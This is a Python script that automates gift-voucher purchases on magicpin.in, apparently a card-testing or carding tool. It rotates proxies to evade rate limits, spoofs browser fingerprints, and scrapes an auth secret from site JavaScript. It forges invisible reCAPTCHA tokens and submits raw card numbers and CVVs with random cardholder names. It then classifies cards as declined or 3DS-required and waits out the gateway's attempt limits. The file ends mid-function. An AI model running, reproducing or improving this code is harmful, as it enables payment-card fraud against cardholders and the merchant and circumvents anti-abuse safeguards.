#!/usr/bin/env python3
import os
import sys
import json
import time
import random
import base64
import re
from urllib.parse import urlparse, parse_qs, quote, unquote
from concurrent.futures import ThreadPoolExecutor

if "LD_PRELOAD" not in os.environ and os.path.exists("/data/data/com.termux/files/usr/lib/libc++_shared.so"):
    os.environ["LD_PRELOAD"] = "/data/data/com.termux/files/usr/lib/libc++_shared.so"
    os.execv(sys.executable, [sys.executable] + sys.argv)

import httpx

SESSION_FILE = "session.json"
AUTH_SECRET_KEY = "kQLMCQBrfevxhzuPpFWT"
APP_VERSION = "5001"
CAPTCHA_SITE_KEY = "6Ld16sUhAAAAAFvZrLRlgs1FMOK-NDAgMyeXTZai"

PROXY_FILE = os.environ.get(
    "MP_PROXY_FILE",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxy.txt"),
)

_proxy_pool: list = []
_proxy_pool_loaded = False


def _load_proxies() -> list:
    """Load the proxy pool from proxy.txt (one proxy per line, user:pass@host:port)."""
    global _proxy_pool, _proxy_pool_loaded
    if _proxy_pool_loaded:
        return _proxy_pool
    pool = []
    try:
        with open(PROXY_FILE, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if line.startswith(("http://", "https://", "socks5://", "socks4://")):
                    pool.append(line)
                else:
                    pool.append("http://" + line)
    except Exception:
        pool = []
    _proxy_pool = pool
    _proxy_pool_loaded = True
    return _proxy_pool


def build_proxy(override=None):
    """Return override if given, else a random proxy from proxy.txt."""
    if override and isinstance(override, str) and override.startswith(("http", "socks")):
        return override
    pool = _load_proxies()
    if not pool:
        return ""
    return random.choice(pool)

VOUCHERS_CATALOG = {
    "1": {"name": "Amazon Pay", "merchant_id": 5980613, "url": "https://magicpin.in/Amazon-Pay-offers/292901/", "category": "Shopping & Payments"},
    "2": {"name": "Google Play Recharge", "merchant_id": 26759740, "url": "https://magicpin.in/Google-Play-Recharge-offers/308568/", "category": "Apps & Play Store"},
    "3": {"name": "Zomato", "merchant_id": 4924499, "url": "https://magicpin.in/profilemerchant?userId=4924499&tabType=store_visit", "category": "Food Delivery"},
    "4": {"name": "Blinkit", "merchant_id": 4376387, "url": "https://magicpin.in/profilemerchant?userId=4376387&tabType=store_visit", "category": "Instant Grocery"},
    "5": {"name": "Uber", "merchant_id": 4729943, "url": "https://magicpin.in/Uber-offers/34489/", "category": "Cabs & Rides"},
    "6": {"name": "Myntra", "merchant_id": 5302129, "url": "https://magicpin.in/profilemerchant?userId=5302129&tabType=store_visit", "category": "Fashion & Lifestyle"},
    "7": {"name": "Nykaa", "merchant_id": 7241117, "url": "https://magicpin.in/profilemerchant?userId=7241117&tabType=store_visit", "category": "Beauty & Cosmetics"},
    "8": {"name": "BookMyShow", "merchant_id": 1355791, "url": "https://magicpin.in/profilemerchant?userId=1355791&tabType=store_visit", "category": "Movies & Events"},
    "9": {"name": "PVR Cinemas", "merchant_id": 9054036, "url": "https://magicpin.in/profilemerchant?userId=9054036&tabType=store_visit", "category": "Cinema Vouchers"},
    "10": {"name": "MakeMyTrip", "merchant_id": 3314200, "url": "https://magicpin.in/profilemerchant?userId=3314200&tabType=store_visit", "category": "Travel & Flights"}
}

FINGERPRINTS = [
    ("131.0.6778.86", "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\""),
    ("130.0.6723.70", "\"Google Chrome\";v=\"130\", \"Chromium\";v=\"130\", \"Not.A/Brand\";v=\"99\""),
    ("129.0.6668.100", "\"Google Chrome\";v=\"129\", \"Chromium\";v=\"129\", \"Not_A Brand\";v=\"24\""),
    ("128.0.6613.120", "\"Google Chrome\";v=\"128\", \"Chromium\";v=\"128\", \"Not_A Brand\";v=\"24\""),
    ("127.0.6533.100", "\"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\", \"Not_A Brand\";v=\"24\""),
    ("126.0.6478.127", "\"Google Chrome\";v=\"126\", \"Chromium\";v=\"126\", \"Not_A Brand\";v=\"24\""),
    ("125.0.6422.165", "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\""),
    ("124.0.6367.208", "\"Google Chrome\";v=\"124\", \"Chromium\";v=\"124\", \"Not_A Brand\";v=\"24\""),
    ("123.0.6312.110", "\"Google Chrome\";v=\"123\", \"Chromium\";v=\"123\", \"Not_A Brand\";v=\"24\""),
    ("122.0.6261.130", "\"Google Chrome\";v=\"122\", \"Chromium\";v=\"122\", \"Not_A Brand\";v=\"24\""),
]
LANGS = ["en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7", "en-IN,en;q=0.9", "en-US,en;q=0.9,hi;q=0.8", "en-GB,en;q=0.9,hi;q=0.8"]
FIRST_NAMES = ["Aarav", "Vivaan", "Aditya", "Vihaan", "Arjun", "Sai", "Reyansh", "Ayaan", "Krishna", "Ishaan", "Ananya", "Diya", "Myra", "Sara", "Aadhya", "Ira", "Aanya", "Pari", "Riya", "Kavya", "Rahul", "Amit", "Priya", "Neha", "Rohit", "Pooja", "Vikram", "Sneha", "Deepak", "Anjali"]
LAST_NAMES = ["Sharma", "Verma", "Patel", "Gupta", "Singh", "Kumar", "Reddy", "Nair", "Joshi", "Mehta", "Shah", "Das", "Rao", "Pillai", "Iyer", "Bhat", "Mishra", "Chauhan", "Pandey", "Kapoor"]


def random_name():
    return f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"


def fresh_fingerprint():
    ver, sec = random.choice(FINGERPRINTS)
    return {
        "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver} Safari/537.36",
        "accept-language": random.choice(LANGS),
        "sec-ch-ua": sec,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "accept-encoding": "gzip, deflate, br",
    }


def emit(result):
    print(json.dumps(result, ensure_ascii=False, default=str))
    return result


class Magicpin:
    def __init__(self, quiet=False, proxy=None):
        self.quiet = quiet
        self._proxy_override = proxy if (proxy and isinstance(proxy, str) and proxy.startswith(("http", "socks"))) else None
        self.proxy = build_proxy(self._proxy_override)
        self.phone = None
        self.user_id = None
        self.auth_token = None
        self.user_w_id = None
        self.user_name = "Magicpin User"
        self.email = ""
        self.city = "New Delhi"
        self.locality = "Chandni Chowk"
        self.lat = "28.6505942"
        self.lon = "77.2303284"
        self.auth_secret_key = AUTH_SECRET_KEY
        self.app_version = APP_VERSION
        self.captcha_site_key = CAPTCHA_SITE_KEY
        self.config_ts = 0
        self._txn_baseline = None
        self._init_http()
        self.load_session()
        self._ensure_config()

    def _init_http(self):
        self.proxy = build_proxy(self._proxy_override)
        # direct IP (no proxy) — only for the egress-engagement check
        try:
            self._direct_fingerprint = httpx.get("https://api.ipify.org?format=json", timeout=15).json().get("ip", "")
        except Exception:
            self._direct_fingerprint = ""
        # main magicpin.in API — THROUGH the residential proxy so the VPS IP
        # never touches magicpin.in directly (avoids 503 rate-limit).
        proxy = self.proxy
        try:
            self.http = httpx.Client(
                http2=True,
                follow_redirects=True,
                timeout=20.0,
                proxy=proxy or None,
                limits=httpx.Limits(max_connections=10, max_keepalive_connections=6),
            )
        except TypeError:
            try:
                self.http = httpx.Client(
                    http2=True,
                    follow_redirects=True,
                    timeout=20.0,
                    proxies={"http://": proxy, "https://": proxy} if proxy else None,
                    limits=httpx.Limits(max_connections=10, max_keepalive_connections=6),
                )
            except Exception:
                self.http = httpx.Client(follow_redirects=True, timeout=20.0)
        except Exception:
            self.http = httpx.Client(follow_redirects=True, timeout=20.0)
        self._rebuild_pg()
        if self.px is not self.http:
            try:
                self._egress_fingerprint = self.px.get("https://api.ipify.org?format=json", timeout=15).json().get("ip", "")
                if self._egress_fingerprint and self._egress_fingerprint == self._direct_fingerprint:
                    self._log("[!] warning: proxy egress IP matches direct IP; proxy not engaged")
            except Exception:
                pass
        try:
            self.pg.get("https://pg.magicpin.com/", timeout=12)
        except Exception:
            pass

    def _rebuild_pg(self):
        self._egress_fingerprint = ""  # guard: never left unset if proxy setup fails
        proxy = build_proxy(self._proxy_override)
        self.proxy = proxy
        try:
            from curl_cffi import requests as cffi
            self.pg = cffi.Session(impersonate="chrome110", proxies={"http": proxy, "https": proxy})
            self.pg_http2 = False
        except Exception:
            kw = {"follow_redirects": True, "timeout": 20.0}
            try:
                self.pg = httpx.Client(proxy=proxy, **kw)
            except Exception:
                self.pg = httpx.Client(proxies={"http://": proxy, "https://": proxy}, **kw)
            self.pg_http2 = True
        try:
            self.px = httpx.Client(
                http2=True,
                follow_redirects=True,
                timeout=20.0,
                proxy=proxy,
                limits=httpx.Limits(max_connections=10, max_keepalive_connections=6),
            )
            self._egress_fingerprint = self.px.get("https://api.ipify.org?format=json", timeout=15).json().get("ip", "")
        except TypeError:
            try:
                self.px = httpx.Client(
                    http2=True,
                    follow_redirects=True,
                    timeout=20.0,
                    proxies={"http://": proxy, "https://": proxy},
                    limits=httpx.Limits(max_connections=10, max_keepalive_connections=6),
                )
                self._egress_fingerprint = self.px.get("https://api.ipify.org?format=json", timeout=15).json().get("ip", "")
            except Exception:
                self.px = self.http
        except Exception:
            self.px = self.http
            self._egress_fingerprint = getattr(self, "_direct_fingerprint", "") or ""
        return self._egress_fingerprint

    def _log(self, msg):
        if not self.quiet:
            print(msg, flush=True)

    def _scrape_config(self):
        def grab(url):
            try:
                r = self.http.get(url, timeout=8)
                if r.status_code != 200:
                    return None
                return r.text
            except Exception:
                return None

        try:
            home = grab("https://magicpin.in/") or ""
            js = re.findall(r'src=["\'](https://static\.magicpin\.com/samara/static/js/[^"\']+\.js(?:\.gz)?[^"\']*)["\']', home)
            js = ["https://static.magicpin.com/samara/static/js/base/main.js"] + [u for u in js if u not in js[:1]]
            with ThreadPoolExecutor(max_workers=4) as ex:
                bodies = [b for b in ex.map(grab, js[:6]) if b]
            key = self.auth_secret_key
            ver = self.app_version
            cap = CAPTCHA_SITE_KEY
            for body in bodies:
                if key == self.auth_secret_key:
                    m = re.search(r'set\(\s*["\']auth-secret-key["\']\s*,\s*["\']([A-Za-z0-9_-]{8,64})["\']', body)
                    if not m:
                        m = re.search(r'["\']auth-secret-key["\']\s*:\s*["\']([A-Za-z0-9_-]{8,64})["\']', body)
                    if m:
                        key = m.group(1)
                if ver == self.app_version:
                    m = re.search(r'(?<![A-Z_])APP_VERSION\s*=\s*(\d+)', body)
                    if m:
                        ver = m.group(1)
                if cap == CAPTCHA_SITE_KEY:
                    m = re.search(r'GOOGLE_CAPTCHA_KEY\s*=\s*["\'](6L[a-zA-Z0-9_-]{20,})["\']', body)
                    if m:
                        cap = m.group(1)
            self.auth_secret_key = key
            self.app_version = ver
            self.captcha_site_key = cap
            self.config_ts = time.time()
            self.save_session()
        except Exception:
            pass

    def _ensure_config(self):
        if self.config_ts and time.time() - self.config_ts < 43200:
            return
        self._scrape_config()

    def _hdr(self, site="same-origin", mode="cors", dest="empty", extra=None):
        h = fresh_fingerprint()
        h.update({"sec-fetch-site": site, "sec-fetch-mode": mode, "sec-fetch-dest": dest})
        if extra:
            h.update(extra)
        return h

    def _req(self, method, url, retries=4, **kw):
        last = None
        kw.setdefault("timeout", 20)
        for attempt in range(max(1, retries)):
            try:
                return self.http.request(method, url, **kw)
            except Exception as e:
                last = e
                msg = str(e)
                transient = any(x in msg for x in ("502", "503", "504", "timed out", "timeout", "CONNECT tunnel", "Empty reply", "Recv failure", "Reset", "Connection"))
                if not transient or attempt == retries - 1:
                    raise
                time.sleep(0.3 * (attempt + 1) + random.uniform(0, 0.2))

    def _pg_req(self, method, url, retries=4, **kw):
        last = None
        kw.setdefault("timeout", 20)
        for attempt in range(max(1, retries)):
            try:
                return self.pg.request(method, url, **kw)
            except Exception as e:
                last = e
                msg = str(e)
                transient = any(x in msg for x in ("502", "503", "504", "timed out", "timeout", "CONNECT tunnel", "Empty reply", "Recv failure", "Reset", "Connection"))
                if not transient or attempt == retries - 1:
                    raise
                time.sleep(0.3 * (attempt + 1) + random.uniform(0, 0.2))

    def _px_req(self, method, url, retries=4, **kw):
        last = None
        kw.setdefault("timeout", 25)
        for attempt in range(max(1, retries)):
            try:
                return self.px.request(method, url, **kw)
            except Exception as e:
                last = e
                msg = str(e)
                transient = any(x in msg for x in ("502", "503", "504", "timed out", "timeout", "CONNECT tunnel", "Empty reply", "Recv failure", "Reset", "Connection", "403"))
                if not transient or attempt == retries - 1:
                    raise
                time.sleep(0.5 * (attempt + 1) + random.uniform(0, 0.3))

    def load_session(self):
        if not os.path.exists(SESSION_FILE):
            return
        try:
            with open(SESSION_FILE, "r") as f:
                data = json.load(f)
            self.phone = data.get("phone")
            self.user_id = data.get("user_id")
            self.auth_token = data.get("auth_token")
            self.user_w_id = data.get("user_w_id")
            self.user_name = data.get("user_name", "Magicpin User")
            self.email = data.get("email", "")
            self.city = data.get("city", "New Delhi")
            self.locality = data.get("locality", "Chandni Chowk")
            self.lat = data.get("lat", "28.6505942")
            self.lon = data.get("lon", "77.2303284")
            cfg = data.get("config") or {}
            if cfg.get("key"):
                self.auth_secret_key = cfg["key"]
            if cfg.get("version"):
                self.app_version = cfg["version"]
            if cfg.get("captcha"):
                self.captcha_site_key = cfg["captcha"]
            self.config_ts = cfg.get("ts", 0)
            for k, v in data.get("cookies", {}).items():
                self.http.cookies.set(k, str(v), domain=".magicpin.in")
        except Exception:
            pass
        self._seed_auth_cookies()

    def _seed_auth_cookies(self):
        seed = {
            "user_id": str(self.user_id) if self.user_id else None,
            "auth_token": None if not self.auth_token else quote(self.auth_token, safe="._-"),
            "user_w_id": self.user_w_id,
            "is_new_user": "false",
            "locality": "Chandni%20Chowk",
            "city": "New%20Delhi",
            "lat": self.lat,
            "lon": self.lon,
        }
        for k, v in seed.items():
            if v is None:
                continue
            try:
                existing = dict(self.http.cookies.items()).get(k)
                if existing != v:
                    self.http.cookies.set(k, str(v), domain=".magicpin.in")
            except Exception:
                self.http.cookies.set(k, str(v), domain=".magicpin.in")

    def save_session(self):
        self._seed_auth_cookies()
        cookies = {}
        try:
            cookies = dict(self.http.cookies.items())
        except Exception:
            pass
        data = {
            "phone": self.phone,
            "user_id": self.user_id,
            "auth_token": self.auth_token,
            "user_w_id": self.user_w_id,
            "user_name": self.user_name,
            "email": self.email,
            "city": self.city,
            "locality": self.locality,
            "lat": self.lat,
            "lon": self.lon,
            "config": {"key": self.auth_secret_key, "version": self.app_version, "captcha": self.captcha_site_key, "ts": self.config_ts},
            "cookies": cookies,
        }
        with open(SESSION_FILE, "w") as f:
            json.dump(data, f, indent=2)

    def authed(self):
        return bool(self.auth_token and self.user_id and self.phone)

    def reset_session(self):
        self.phone = None
        self.user_id = None
        self.auth_token = None
        self.user_w_id = None
        try:
            self.http.cookies.clear()
        except Exception:
            pass
        if os.path.exists(SESSION_FILE):
            try:
                os.remove(SESSION_FILE)
            except Exception:
                pass

    def mint_recaptcha(self, action="submit"):
        site_key = self.captcha_site_key
        co = "aHR0cHM6Ly9tYWdpY3Bpbi5pbjo0NDM"
        anchor = f"https://www.google.com/recaptcha/api2/anchor?ar=1&k={site_key}&co={co}&hl=en&v=hzHrW5L7r5gS42REH6CmVH6Y&size=invisible&cb={random.random()}"
        self.http.headers.update(self._hdr("none", "navigate", "document"))
        self.http.headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        try:
            r = self.http.get(anchor, timeout=20)
            m = re.search(r'id="recaptcha-token" value="([^"]+)"', r.text)
            if not m:
                return ""
            form = f"v=hzHrW5L7r5gS42REH6CmVH6Y&reason=q&c={m.group(1)}&k={site_key}&co={co}&hl=en&size=invisible&sa={action}"
            r2 = self.http.post(
                "https://www.google.com/recaptcha/api2/reload",
                content=form,
                headers={"content-type": "application/x-www-form-urlencoded", "referer": anchor},
                timeout=20,
            )
            m2 = re.search(r'"rresp","([^"]+)"', r2.text)
            return m2.group(1) if m2 else ""
        except Exception:
            return ""

    def send_otp(self, phone, token=""):
        clean = phone.strip().replace("+", "")
        if len(clean) == 10:
            clean = "91" + clean
        self.phone = clean
        headers = self._hdr("same-site", "cors", "empty", {
            "accept": "*/*",
            "auth-secret-key": self.auth_secret_key,
            "content-type": "application/json",
            "origin": "https://magicpin.in",
            "referer": "https://magicpin.in/",
        })
        payload = {"phoneNumber": clean, "email": "", "authMethod": "SMS"}
        if not token:
            token = self.mint_recaptcha()
        if token:
            payload["token"] = token
        try:
            r = self._req("POST", "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/", json=payload, headers=headers, retries=2)
            return r.json()
        except Exception as e:
            return {"status": "ERROR", "message": str(e)}

    def verify_otp(self, phone, otp):
        clean = phone.strip().replace("+", "")
        if len(clean) == 10:
            clean = "91" + clean
        self.phone = clean
        headers = self._hdr("same-site", "cors", "empty", {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://magicpin.in",
            "referer": "https://magicpin.in/",
        })
        payload = {
            "phone": clean,
            "otp": str(otp).strip(),
            "lat": self.lat,
            "lon": self.lon,
            "source_of_origin": "customer_web",
            "authMethod": "",
            "queryParams": "?utm_medium=stores&utm_source=search&utm_content=search_v6&utm_campaign=%24search&enableYSF=false",
        }
        try:
            data = self.http.post("https://webapi.magicpin.in/ultron-web/login/", json=payload, headers=headers).json()
        except Exception:
            return {}
        api = data.get("apiResponse") if isinstance(data.get("apiResponse"), dict) else {}
        uid = data.get("user_id") or api.get("user_id")
        tok = data.get("auth_token") or data.get("access_token") or api.get("auth_token") or api.get("access_token")
        if not uid or not tok:
            try:
                jar = dict(self.http.cookies.items())
                uid = uid or jar.get("user_id")
                tok = tok or jar.get("auth_token") or jar.get("access_token")
            except Exception:
                pass
        if uid and tok:
            self.user_id = str(uid)
            self.auth_token = str(tok)
            self.user_w_id = base64.b64encode(clean.encode("utf-8")).decode("utf-8")
            self.user_name = data.get("first_name") or api.get("name") or self.user_name
            for k, v in {"user_id": self.user_id, "auth_token": self.auth_token, "user_w_id": self.user_w_id, "is_new_user": "false", "locality": "Chandni%20Chowk", "city": "New%20Delhi", "lat": self.lat, "lon": self.lon}.items():
                self.http.cookies.set(k, str(v), domain=".magicpin.in")
            self.save_session()
        return data

    def fetch_variants(self, url, default_mid=None):
        r = None
        last_code = 0
        for attempt in range(3):
            try:
                r = self.http.get(url, timeout=20)
                last_code = r.status_code
                if r.status_code == 200:
                    break
                if r.status_code < 500:
                    break
            except Exception:
                last_code = 0
            time.sleep(1.0 * (attempt + 1))
        if r is None or r.status_code != 200:
            raise ValueError(f"page http {last_code or 0}")
        html = r.text
        mid = default_mid
        name = ""
        vouchers = []
        m = re.search(r"['\"]muid['\"]\s*:\s*['\"]?(\d+)['\"]?", html)
        if m:
            mid = int(m.group(1))
        for block in re.findall(r'<script\s+type=[\'"]application/ld\+json[\'"]>(.*?)</script>', html, re.DOTALL):
            try:
                d = json.loads(block.strip())
                if d.get("@type") != "Product":
                    continue
                name = d.get("name", "")
                for off in d.get("offers", {}).get("offers", []):
                    p_url = off.get("url", "")
                    roa = parse_qs(urlparse(p_url).query).get("selected_voucher_roa_id", [None])[0]
                    price = off.get("price")
                    if roa and price is not None:
                        vouchers.append({"roa_id": int(roa), "amount": float(price), "name": off.get("name", ""), "in_stock": "InStock" in off.get("availability", "")})
            except Exception:
                pass
        if not vouchers or not mid:
            m = re.search(r'<script\s+id=[\'"]__NEXT_DATA__[\'"]\s+type=[\'"]application/json[\'"]>(.*?)</script>', html, re.DOTALL)
            if m:
                try:
                    nd = json.loads(m.group(1))
                    md = nd.get("props", {}).get("pageProps", {}).get("merchantData", {})
                    mid = mid or md.get("merchantUserId") or md.get("merchantId")
                    name = name or md.get("name", "")
                    if not vouchers and "vouchers" in md:
                        for v in md["vouchers"]:
                            vouchers.append({"roa_id": v.get("redemption_option_amount_id"), "amount": float(v.get("amount", 0)), "name": v.get("description", ""), "in_stock": v.get("is_stock_available", True)})
                except Exception:
                    pass
        return {"merchant_id": mid, "merchant_name": name or "Brand Voucher", "vouchers": vouchers}

    def payment_division(self, merchant_id, roa_id, amount, count=1):
        headers = self._hdr("same-origin", "cors", "empty", {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://magicpin.in",
            "referer": "https://magicpin.in/vouchers/",
            "priority": "u=1, i",
        })
        total = float(amount) * int(count)
        payload = {
            "phone": self.phone,
            "amount": total,
            "userCoupon": None,
            "vouchers": [{"merchantId": int(merchant_id), "redemptionOptionAmountId": int(roa_id), "amount": float(amount), "count": int(count), "merchantUserId": int(merchant_id)}],
            "magicProSubscriptionId": "",
            "removeMagicProAutoAdd": False,
            "email": self.email,
        }
        r = self.http.post("https://magicpin.in/sam-api/vouchers/getPaymentDivision/", json=payload, headers=headers)
        if r.status_code != 200:
            raise ValueError(f"cart http {r.status_code}")
        res = r.json().get("data", r.json())
        return {
            "total_face_value": total,
            "payable_amount": float(res.get("payable_amount") or res.get("pg_amount") or total),
            "points_used": res.get("magicpin_amount", 0),
            "points_balance": res.get("magicpinBalance", 0),
        }

    def claim_free(self, merchant_id, roa_id, amount, count=1):
        headers = self._hdr("same-origin", "cors", "empty", {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://magicpin.in",
            "referer": "https://magicpin.in/vouchers/",
            "priority": "u=1, i",
        })
        total = float(amount) * int(count)
        payload = {
            "amount": total,
            "vouchers": [{"merchantId": int(merchant_id), "redemptionOptionAmountId": int(roa_id), "amount": float(amount), "count": int(count), "merchantUserId": int(merchant_id)}],
            "phone": self.phone,
            "email": self.email,
            "userCoupon": None,
        }
        r = self.http.post("https://magicpin.in/sam-api/vouchers/payMp/", json=payload, headers=headers)
        try:
            return r.json()
        except Exception:
            return {"status": "RESP", "text": r.text, "status_code": r.status_code}

    def initiate_gateway(self, merchant_id, roa_id, amount, count, payable, retries=2, cooldown=60):
        self.last_pg_code = None
        self.last_pg_message = ""
        for attempt in range(retries):
            headers = self._hdr("same-origin", "navigate", "document", {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://magicpin.in",
                "referer": "https://magicpin.in/vouchers/",
                "upgrade-insecure-requests": "1",
                "priority": "u=0, i",
            })
            payment = {
                "firstName": self.user_name,
                "phone": self.phone,
                "email": self.email,
                "amount": payable,
                "accessToken": self.auth_token,
                "userId": self.user_id,
                "type": "wallet",
                "sourceOfCall": "web",
                "couponData": {
                    "multipleRedemptions": [{"merchantId": int(merchant_id), "redemptionOptionAmountId": int(roa_id), "amount": float(amount), "count": int(count), "merchantUserId": int(merchant_id)}],
                    "merchant_id": int(merchant_id),
                    "phone_no": self.phone,
                    "recharge_to": self.phone,
                    "mp-authorization": self.auth_token,
                    "app-version": str(self.app_version),
                    "totalItems": int(count),
                    "operator": "",
                    "pay_value": payable,
                    "type": "redemption",
                    "country": "IN",
                    "userCoupon": None,
                    "firstName": self.user_name,
                    "email": self.email,
                    "sourceOfCall": "web",
                },
                "callback_url": "https://magicpin.in/payment/result/",
                "userType": "CUSTOMER_WEB",
                "paymentMotive": "VOUCHER_PURCHASE",
            }
            r = self._px_req("POST", "https://magicpin.in/samapi/users/payment/", data={"data": json.dumps(payment)}, headers=headers, follow_redirects=False)
            loc = r.headers.get("Location") or ""
            body = r.text or ""
            txn = None
            m = re.search(r"/page/([a-zA-Z0-9_-]+)/startpayment", loc) or re.search(r"/page/([a-zA-Z0-9_-]+)/startpayment", body)
            if m:
                txn = m.group(1)
            if not txn:
                m = re.search(r"['\"](?:txnId|transactionId|paymentSessionId)['\"]\s*:\s*['\"]([a-zA-Z0-9_-]+)['\"]", body)
                if m:
                    txn = m.group(1)
            if not txn:
                try:
                    j = r.json()
                    txn = (j.get("data") or j).get("txnId") or (j.get("data") or j).get("transactionId")
                except Exception:
                    pass
            if txn:
                self.last_pg_code = "OK"
                return txn

            msg = ""
            m = re.search(r"message=([^&]+)", loc) or re.search(r'"message"\s*:\s*"([^"]+)"', body)
            if m:
                msg = unquote(m.group(1))
                if not msg:
                    msg = m.group(1)
            failed = bool(re.search(r"status=(FAILURE|FAILED|ERROR)", loc, re.I)) or "FAILURE" in body.upper() or "FAILED" in body.upper()
            limited = "failed payment attempts" in msg.lower() or "try again after some time" in msg.lower() or "exceeded" in msg.lower()
            if failed and limited:
                self.last_pg_code = "PG_ATTEMPT_LIMIT"
                self.last_pg_message = msg or loc
                if attempt < retries - 1:
                    self._log(f"[>] gateway attempt-limit; cooling {cooldown}s ({attempt+1}/{retries})")
                    time.sleep(cooldown)
                    continue
                break
            if failed:
                self.last_pg_code = "PG_FAILURE"
                self.last_pg_message = msg or loc
                break
            self.last_pg_code = "UNPARSED"
            self.last_pg_message = f"http {r.status_code} {loc[:120] or body[:120]}"
            break
        return None

    def pg_options(self, txn_id):
        headers = self._hdr("same-origin", "cors", "empty", {
            "accept": "application/json, text/plain, */*",
            "origin": "https://pg.magicpin.com",
            "referer": f"https://pg.magicpin.com/page/{txn_id}/startpayment",
            "priority": "u=1, i",
        })
        return self._pg_req("GET", f"https://pg.magicpin.com/pg/payment/getPaymentOptions/{txn_id}?merchantWalletSelected=true", headers=headers).json()

    def verify_card(self, txn_id, card_no):
        headers = self._hdr("same-origin", "cors", "empty", {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://pg.magicpin.com",
            "referer": f"https://pg.magicpin.com/page/{txn_id}/startpayment/addnewcard",
            "priority": "u=1, i",
        })
        r = self._pg_req("POST", "https://pg.magicpin.com/cards/verify/cardNumber", json={"cardNo": card_no, "txnId": txn_id, "userId": str(self.user_id)}, headers=headers)
        try:
            return r.json()
        except Exception:
            return {"status": "RESP", "text": r.text}

    def make_payment(self, txn_id, card_no, exp_mon, exp_yr, cvv, amount, card_name=None):
        headers = self._hdr("same-origin", "cors", "empty", {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://pg.magicpin.com",
            "referer": f"https://pg.magicpin.com/page/{txn_id}/startpayment/addnewcard",
            "priority": "u=1, i",
        })
        payload = {
            "txnId": txn_id,
            "userType": "CUSTOMER_WEB",
            "firstName": None,
            "emailId": self.email,
            "amount": float(amount),
            "phoneNo": self.phone,
            "userId": str(self.user_id),
            "storeCard": "0",
            "paymentMode": "card",
            "cardNo": card_no,
            "cardName": card_name or random_name(),
            "cvv": cvv,
            "cardExpMon": exp_mon,
            "cardExpYear": exp_yr,
            "pgCouponCode": False,
            "instrumentId": card_no,
            "paymentInstrument": "card",
            "isMandateActivationFlow": False,
            "appVersion": int(self.app_version),
            "shouldOpenDirectOtp": True,
            "magicCashSelected": False,
            "magicCashAmount": 0,
        }
        r = self._pg_req("POST", "https://pg.magicpin.com/cards/payment/makePayment", json=payload, headers=headers)
        try:
            return r.json()
        except Exception:
            return {"status": "ERROR", "text": r.text, "status_code": r.status_code}

    def cashfree_eval(self, payment_url, currency="EUR"):
        try:
            r = self.http.get(payment_url, timeout=10)
            text = r.text
            m = re.search(r"<a[^>]*href=['\"]([^'\"]+)['\"][^>]*id=['\"]redirectLink['\"]", text)
            if m:
                r = self.http.get(m.group(1), timeout=10)
                text = r.text
            if r.url and payment_url not in str(r.url) and "api.cashfree.com" not in str(r.url):
                return {"status": "3DS_REQUIRED", "challenge_url": str(r.url), "html_text": text}
            m_err = re.search(r'id=[\'"]error-text[\'"]>([^<]+)<', text)
            m_word = re.search(r'class=[\'"][^\'"]*break-word[^\'"]*[\'"]>([^<]+)<', text)
            if m_err or m_word or r.status_code >= 400 or "Broken Link!" in text:
                msg = (m_err.group(1).strip() if m_err else None) or (m_word.group(1).strip() if m_word else None)
                if msg:
                    try:
                        d = json.loads(msg)
                        msg = d.get("message") or msg
                    except Exception:
                        pass
                else:
                    msg = f"cashfree rejected (http {r.status_code})"
                return {"status": "DECLINED", "reason": msg, "html_text": text}
            m_sess = re.search(r'(session_[a-zA-Z0-9_-]+paymentpayment)', text) or re.search(r'pt=(session_[a-zA-Z0-9_-]+)', text)
            if m_sess:
                sess = m_sess.group(1)
                headers = self._hdr("same-origin", "cors", "empty", {
                    "accept": "application/json, text/plain, */*",
                    "content-type": "application/json",
                    "origin": "https://api.cashfree.com",
                    "referer": f"https://api.cashfree.com/checkout/international?pt={m_sess.group(1)}",
                    "priority": "u=1, i",
                })
                rp = self.http.post(f"https://api.cashfree.com/checkout/api/international/pay/{sess}", json={"currency": currency, "external_screening_token": "", "user_agent": self.http.headers.get("user-agent", "")}, headers=headers, timeout=10)
                if rp.status_code == 200:
                    d = rp.json()
                    url = (d.get("data") or {}).get("url")
                    if url:
                        chk = self.http.get(url, timeout=8)
                        e = re.search(r'id=[\'"]error-text[\'"]>([^<]+)<', chk.text)
                        if e or chk.status_code >= 400 or "Broken Link!" in chk.text:
                            return {"status": "DECLINED", "reason": e.group(1).strip() if e else f"challenge rejected (http {chk.status_code})", "dcc_response": rp.text, "html_text": chk.text}
                        return {"status": "3DS_REQUIRED", "challenge_url": url, "html_text": chk.text, "dcc_response": rp.text}
                    if d.get("message"):
                        return {"status": "DECLINED", "reason": d["message"], "dcc_response": rp.text}
                return {"status": "DECLINED", "reason": f"dcc http {rp.status_code}", "dcc_response": rp.text, "html_text": text}
            return {"status": "3DS_REQUIRED", "challenge_url": r.url, "html_text": text}
        except Exception as e:
            return {"status": "DECLINED", "reason": str(e)}

    @staticmethod
    def order_token_from(url):
        if not url:
            return None
